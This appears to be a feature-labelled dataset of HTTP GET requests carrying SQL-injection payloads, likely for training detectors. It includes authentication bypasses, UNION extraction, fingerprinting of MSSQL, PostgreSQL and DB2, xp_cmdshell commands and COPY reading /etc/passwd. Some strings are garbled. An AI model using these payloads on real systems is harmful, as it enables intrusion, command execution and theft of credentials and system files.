54,1,200,2016,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5200,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2259,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2950,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6808,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
31,1,200,3496,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,1549,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
52,1,200,5236,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,5436,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,2559,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,3456,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,6868,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
55,1,200,5313,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,2424,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,2786,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,2882,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3968,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3028,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,2737,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
37,1,200,7937,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,5212,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,3646,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,1463,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,6282,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,6093,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,6179,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,2689,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
51,1,200,5026,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6591,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1505,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1251,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6126,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6422,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
18,1,200,3026,7,2,4,1,1,GET ?id=' HTTP/1.1
26,1,200,7547,7,7,4,2,1,GET login/?id=" # HTTP/1.1
44,1,200,3168,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4181,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
26,1,200,6425,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,7659,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
61,1,200,7788,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,3179,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,7064,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,2028,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
62,1,200,4854,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,7518,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2212,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,7346,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
20,1,200,2224,7,2,6,1,1,GET ?id='-- HTTP/1.1
48,1,200,1489,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5031,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6610,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6412,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7984,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5751,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1306,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1279,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3678,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2193,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1537,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2301,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7929,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
43,1,200,2513,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3793,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,4105,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3120,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3769,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
20,1,200,4134,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,5735,7,2,5,1,1,GET ?id=' # HTTP/1.1
43,1,200,6203,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,5165,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
69,1,200,4935,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,2024,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,1036,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5655,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,6208,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,6203,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,1738,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,1263,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
25,1,200,5832,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
25,1,200,1521,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
46,1,200,4735,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,3527,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2255,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
87,1,200,3794,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,4907,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
28,1,200,2764,7,6,4,1,1,GET ?id=" or "a"="a HTTP/1.1
28,1,200,4327,7,6,4,1,1,GET ?id=" or "a"="a HTTP/1.1
43,1,200,2562,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,2794,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,5215,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
38,1,200,1790,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,7080,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
31,1,200,1524,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
59,1,200,7265,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,6184,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,5340,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,4810,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,6189,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
37,1,200,7863,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
37,1,200,4085,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
33,1,200,6025,7,10,8,1,1,GET ?id=' or 'one'='one¡V HTTP/1.1
33,1,200,7330,7,10,8,1,1,GET ?id=' or 'one'='one¡V HTTP/1.1
38,1,200,3757,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,3952,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,4907,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7976,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
33,1,200,6021,7,9,4,1,1,GET ?id=admin" or "1"="1 HTTP/1.1
37,1,200,6780,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,1525,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
38,1,200,2275,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,4954,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
33,1,200,6847,7,9,5,3,1,GET login/?id=" or 1=1/* HTTP/1.1
58,1,200,6638,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,1083,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,4397,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,7434,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,1127,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
39,1,200,2915,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
39,1,200,4817,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
39,1,200,3005,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
37,1,200,7559,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
49,1,200,7397,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
26,1,200,1557,7,7,4,3,1,GET login/?id="/* HTTP/1.1
26,1,200,3912,7,7,4,3,1,GET login/?id="/* HTTP/1.1
40,1,200,7909,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
32,1,200,7533,7,9,4,2,1,GET login/?id=" or ""^" HTTP/1.1
32,1,200,6810,7,9,4,2,1,GET login/?id=" or ""^" HTTP/1.1
20,1,200,2026,7,2,6,1,1,GET ?id='*' HTTP/1.1
88,1,200,6319,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
27,1,200,2536,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
27,1,200,7686,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
27,1,200,5635,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
65,1,200,6452,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,6510,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,2731,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,5912,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,1462,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,4075,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3614,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,4161,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,6557,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3694,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
52,1,200,1166,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,1483,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,7505,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,6627,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,6960,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3229,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3173,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3737,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
58,1,200,3062,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6350,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,1488,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,4914,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,2754,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,4893,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6791,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,2236,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
20,1,200,5616,7,2,4,1,1,GET ?id=' ¡V HTTP/1.1
20,1,200,6181,7,2,4,1,1,GET ?id=' ¡V HTTP/1.1
37,1,200,2167,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,7188,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,5755,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,4921,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,6798,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
46,1,200,1603,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,4579,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,1402,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,7189,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
35,1,200,6512,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,7086,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
81,1,200,6412,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,6415,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,2249,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,4273,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,5111,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,7457,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,1275,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
28,1,200,6739,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
26,1,200,7837,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
45,1,200,7425,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,3136,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,5609,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
58,1,200,2207,21,16,10,1,1,GET ?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
49,1,200,2738,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,7925,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4623,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,7772,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
42,1,200,2492,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,3906,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,5053,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,1682,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,6705,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
28,1,200,1416,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,6445,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,6206,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
74,1,200,6124,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,1619,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,5856,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
97,1,200,5255,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
97,1,200,3125,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
32,1,200,5880,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
80,1,200,5615,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7278,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7184,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,4459,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
39,1,200,2305,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,7581,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2874,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,1237,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,7920,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,6644,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
49,1,200,2750,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,1104,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,3353,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,4714,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
42,1,200,2031,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
42,1,200,4652,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
42,1,200,6353,7,11,12,2,1,GET login/?id=")) or (("x"))=(("x HTTP/1.1
58,1,200,1916,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,7111,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,7350,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5336,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5113,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
32,1,200,7585,7,9,3,2,1,GET login/?id=" or "" " HTTP/1.1
26,1,200,2615,7,4,4,1,1,GET ?id=" or ""*" HTTP/1.1
26,1,200,1417,7,4,4,1,1,GET ?id=" or ""*" HTTP/1.1
64,1,200,4385,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6406,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,5428,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6013,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,2857,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,2958,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
31,1,200,1496,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5390,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5249,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
56,1,200,4303,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,1636,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,4380,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,4199,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,6251,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,6161,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
55,1,200,1188,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,3639,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,3905,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,3221,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1070,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
27,1,200,7903,7,4,4,1,1,GET ?id=" or 1=1 ¡V HTTP/1.1
43,1,200,7425,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,3998,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,6458,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,4868,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,5116,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
31,1,200,5620,7,12,4,2,1,GET login/?id=admin" # HTTP/1.1
31,1,200,4551,7,12,4,2,1,GET login/?id=admin" # HTTP/1.1
49,1,200,2326,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,5987,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,5195,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,3457,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,7935,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2651,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,1805,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,1978,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
50,1,200,3874,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
50,1,200,1904,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
26,1,200,7132,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
19,1,200,3030,7,2,5,1,0,GET ?id=== HTTP/1.1
19,1,200,2931,7,2,5,1,0,GET ?id=== HTTP/1.1
38,1,200,3207,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
37,1,200,2274,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
58,1,200,1840,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,3147,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
38,1,200,2786,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
26,1,200,4102,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
57,1,200,6972,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1335,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,5472,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1971,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
26,1,200,5866,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
26,1,200,3778,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
31,1,200,1388,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
31,1,200,1875,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
25,1,200,6191,7,4,6,1,2,GET ?id=or 1=1-- HTTP/1.1
25,1,200,5545,7,4,6,1,2,GET ?id=or 1=1-- HTTP/1.1
32,1,200,6501,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
31,1,200,2284,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,4935,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,6466,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,4580,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
39,1,200,3704,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2011,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2866,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,7932,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,1865,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,1431,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2162,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,3202,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,1849,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,6012,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
51,1,200,5307,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,3897,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,2411,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
